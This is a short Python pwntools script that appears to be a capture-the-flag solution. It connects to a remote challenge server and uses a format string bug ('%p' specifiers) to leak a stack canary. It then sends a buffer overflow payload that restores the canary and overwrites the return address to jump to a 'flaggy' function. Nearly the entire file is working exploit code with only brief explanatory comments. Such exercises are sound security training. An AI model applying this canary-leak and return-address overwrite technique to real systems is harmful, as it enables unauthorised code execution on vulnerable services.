from pwn import *
from hexdump import hexdump


"""
Format string attack.
Provide 'y' in payload so that strchr gets us to printf(s) call.
Compute number of %p specifiers (comment below) in order to leak the canary value.
Parse output, extract canary, provide second input to jump to flaggy
(correctly putting canary value in place).
"""


io = remote("141.85.224.99", 31337)
# io = process("./canary")

flaggy = 0x400716

# canary is an 8B value, where lsB is 0
# layout: BUF | CANARY | RBP | RET

buf_size = 0x20 - 0x8 # -8 for canary

payload = "y"           # get to printf(s), to use fmtstr
payload += "%p" * 5     # skip regs: rsi, rdx, rcx, r8, r9
payload += "%p" * 4     # 3 for buf/payload (24), 1 for canary

r = io.recvuntil("[y/n]\n")

io.sendline(payload)
r = io.recv()
r = io.recv()

i = r[::-1].index('x')
canary = r[::-1][:i][::-1][:16]
canary = int(canary, 16)

payload = "A" * buf_size + p64(canary) + "A" * 8 + p64(flaggy)

io.sendline(payload)
r = io.recv()
io.sendline("n")
r = io.recv()
r = io.recv()
print r
